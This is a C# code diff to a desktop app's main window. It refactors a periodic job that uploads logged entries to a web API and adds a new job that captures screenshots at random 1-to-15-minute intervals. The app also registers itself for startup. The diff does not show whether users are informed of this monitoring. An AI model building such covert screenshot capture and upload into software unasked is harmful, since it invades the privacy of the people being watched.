@@ -76,17 +76,10 @@ public partial class MainWindow : Window
 			CrossUtility.RegisterForStartup();
 		}
 
-		// Starting Postman
+		// Starting Jobs
 		{
-			if (!Controls.EnableLoggingOnAPI) return;
-			System.Threading.Tasks.Task.Run(async () =>
-			{
-				while (true)
-				{
-					await System.Threading.Tasks.Task.Delay(_postmanTime);
-					PostmanJob();
-				}
-			});
+			RegisterJob(PostmanJob, () => _postmanTime);
+			RegisterJob(CameramanJob, () => TimeSpan.FromMinutes(new Random().Next(1, 15)));
 		}
 
 		// Restricting Keys
@@ -132,28 +125,46 @@ public partial class MainWindow : Window
 		this.BringIntoView();
 	}
 
-	private static void PostmanJob(object _ = null, object __ = null)
+	private static void NoOperation(object _ = null, object __ = null) { }
+
+	private static void RegisterJob(Action Job, Func<TimeSpan> IntervalGenerator)
 	{
-		try
+		System.Threading.Tasks.Task.Run(async () =>
 		{
-			if (!Controls.EnableCacheLogging) return;
-
-			if (!WebAPI.VerifyDatabase()) return;
-			var entries = Database.GetSavedEntries();
-
-			if (entries.Count == 0) return;
-			var success = WebAPI.SendEntries(entries);
-
-			if (!success) return;
-			Database.Clear();
-		}
-		catch (Exception e)
-		{
-			WebAPI.L1_RegisterException(e);
-		}
+			while (true)
+			{
+				try
+				{
+					await System.Threading.Tasks.Task.Delay(IntervalGenerator());
+					Job();
+				}
+				catch (Exception x) 
+				{
+					WebAPI.RegisterException(x);
+				}
+			}
+		});
 	}
 
-	private static void NoOperation(object _ = null, object __ = null) { }
+	private static void PostmanJob()
+	{
+		if (!Controls.EnableLoggingOnAPI) return;
+
+		if (!WebAPI.VerifyDatabase()) return;
+		var entries = Database.GetSavedEntries();
+
+		if (entries.Count == 0) return;
+		var success = WebAPI.SendEntries(entries);
+
+		if (!success) return;
+		Database.Clear();
+	}
+
+	private static void CameramanJob()
+	{
+		if (!Controls.CaptureScreenshots) return;
+		CrossUtility.CaptureAndSaveScreenshot();
+	}
 
 	// Event Handlers:
 	// ---------------
